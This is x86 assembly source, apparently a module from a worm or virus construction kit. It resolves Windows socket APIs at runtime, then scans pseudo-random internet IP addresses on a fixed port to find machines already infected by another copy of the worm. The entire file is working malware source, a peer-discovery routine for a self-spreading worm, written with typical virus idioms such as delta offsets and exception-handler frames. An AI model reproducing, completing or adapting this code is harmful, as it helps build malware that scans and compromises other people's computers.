;Descr:	This gen searches for infected IP addresses over the internet
;	(it checks pseudo-random IP addresses until some is found)
;
;Type:	GEN_FINDWORM
;
;INPUT:
;(EBX)	NONE
;
;OUTPUT:
;(EAX)	DWORD	IP address (NULL if error)
;

find_worm_ip	Proc
	jmp	find_worm_ftp
	pushad
	@SEH_SetupFrame	<jmp	fwi_seh>

	call	fwi_delta
fwi_delta:
	pop	ebp				;get delta offset

	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.DLL
	xchg	eax,ebx
	@pushsz	'FreeLibrary'
	push	ebx
	call	edi				;and of its APIz...
	mov	[ebp + fwi_FreeLibrary - fwi_delta],eax
	@pushsz	'LoadLibraryA'
	push	ebx
	call	edi

	@pushsz	'WSOCK32'
	call	eax				;load WSOCK32.DLL
	test	eax,eax
	je	fwi_seh
	xchg	eax,ebx
	mov	[ebp + fwi_wsock32 - fwi_delta],ebx

	@pushsz	'socket'
	push	ebx
	call	edi				;and of its APIz...
	mov	[ebp + fwi_socket - fwi_delta],eax
	@pushsz	'connect'
	push	ebx
	call	edi
	mov	[ebp + fwi_connect - fwi_delta],eax
	@pushsz	'closesocket'
	push	ebx
	call	edi
	mov	[ebp + fwi_closesocket - fwi_delta],eax
	@pushsz	'WSACleanup'
	push	ebx
	call	edi
	mov	[ebp + fwi_WSACleanup - fwi_delta],eax
	@pushsz	'WSAStartup'
	push	ebx
	call	edi

	call	@fwi_wsadata
	db	398 dup (?)
@fwi_wsadata:
	push	101h
	call	eax				;initialize WSOCK32
	test	eax,eax
	jne	fwi_free

	push	0
	push	1
	push	2
	mov	eax,12345678h
fwi_socket = dword ptr $-4
	call	eax				;create socket
	inc	eax
	je	fwi_clean
	dec	eax
	mov	[ebp + fwi_hsocket - fwi_delta],eax

	xor	ebx,ebx
fwi_lp:	add	[ebp + fwi_address - fwi_delta],ebx

	push	sizeofsocket
	call	@fwi_socket

		dw	2
		dw	0C200h
fwi_address	dd	0
		db	8 dup (?)

@fwi_socket:
	push	12345678h
fwi_hsocket = dword ptr $-4
	mov	eax,12345678h
fwi_connect = dword ptr $-4
	call	eax				;try to connect to specified IP
	test	eax,eax
	je	fwi_close			;quit if another worm found

	dw	310Fh				;RDTCS
	xor	edx,edx
	mov	ecx,100h
	div	ecx
	dw	0CB0Fh				;BSWAP	EBX
	inc	ebx				;EBX++
	add	ebx,edx				;EBX+=RND(0..255)
	dw	0CB0Fh				;BSWAP	EBX
	jmp	fwi_lp				;try to connect to new calculated IP

fwi_close:
	push	dword ptr [ebp + fwi_hsocket - fwi_delta]
	mov	eax,12345678h
fwi_closesocket = dword ptr $-4
	call	eax				;close socket
fwi_clean:
	mov	eax,12345678h
fwi_WSACleanup = dword ptr $-4
	call	eax				;unitialize WSOCK32
fwi_free:
	push	12345678h
fwi_wsock32 = dword ptr $-4
	mov	eax,12345678h
fwi_FreeLibrary = dword ptr $-4
	call	eax				;unload WSOCK32.DLL
fwi_seh:@SEH_RemoveFrame
	popad
	mov	eax,[ebp + fwi_address - fwi_delta]
	ret					;return IP address of another worm in EAX
end_find_worm_ip:
find_worm_ip	EndP